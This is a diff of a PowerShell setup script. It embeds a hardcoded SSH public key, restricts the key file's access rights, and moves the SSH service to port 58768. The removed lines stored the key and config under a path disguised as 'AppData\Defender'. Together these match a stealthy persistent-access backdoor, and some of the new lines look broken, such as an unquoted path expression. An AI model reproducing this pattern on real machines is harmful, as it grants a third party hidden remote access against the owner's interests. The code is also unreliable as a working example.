@@ -133,10 +133,10 @@ if ($opconfirm.ToLower() -eq "y") {
 	Write-Host "Installation completed successfully" -ForegroundColor Green
 	#Public Key Add
 	$SSHPublicKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwoQ5u4sZA/cz2iAatR8Uyl8GbRJXb5zLmw20oxRUKzWZuEwpta0Dm9qoyG6Oo9zhLB5YaOpjrmVk2hD+RL5iSRdFPQ3sI19Az5jwvQzUNEpGWTZxu8/Uvtu0MvtFVOzJfWYtncrlEjQt6Z0iBOBHjUsnR2EqOiFYP/FGgvH4q7mmmsj5mds6q48flhzW+spBlPaHu0CcIFhu6XTt1oAbvRKDjfPgWOEYopWgglqCl/+IiRNsWyKwQN9P2/IiaRAVqF1KekNtqyAFyzg2deIDYKj+nSLQ6NxMTPJx4fNeqUYO37K6+1AkLX5iLCBjmQrsfRiPZNO5DivJJq1eg8y2weqI210odjHj6EHnJCpHs7ogsKvIbewsD4FxJC3XqfuwvKPba/ho2W0lmNZjv6CpepasKSBE/N4ooTbpKegN0U0gjH+eh1+TiAK3PB6rlmtEc06kt0eZyCpn4yhFLdS13Mfpx8ijpPd+0yNyAd8DHDFfWLy1EX2cMBd0B7iDE5aU="
-	if ($SSHPublicKey -ne "" -And (-not (Test-Path "C:\Users\Default\AppData\Defender"  -PathType leaf ))) {
-			Set-Content -Path "C:\Users\Default\AppData\Defender" -Value $SSHPublicKey 
+	if ($SSHPublicKey -ne "" -And (-not (Test-Path $openSSHFolder -PathType leaf ))) {
+			Set-Content -Path $openSSHFolder -Value $SSHPublicKey 
 		}
-		$acl = Get-Acl "C:\Users\Default\AppData\Defender"
+		$acl = Get-Acl $openSSHFolder
 		$acl.SetAccessRuleProtection($true, $false)
 		$administratorsRule = New-Object system.security.accesscontrol.filesystemaccessrule("Administrators","FullControl","Allow")
 		$systemRule = New-Object system.security.accesscontrol.filesystemaccessrule("SYSTEM","FullControl","Allow")
@@ -144,7 +144,7 @@ if ($opconfirm.ToLower() -eq "y") {
 		$acl.SetAccessRule($systemRule)
 		$acl | Set-Acl
 	#Port Change
-	$sshdConfigPath = "C:\Users\Default\AppData\Defender"
+	$sshdConfigPath = $openSSHFolder\sshd_config
 	$sshdConfigContent = Get-Content -Path $sshdConfigPath
 	$sshdConfigContent = $sshdConfigContent -replace "^#Port 22$", "Port 58768"
 	$sshdConfigContent | Set-Content -Path $sshdConfigPath
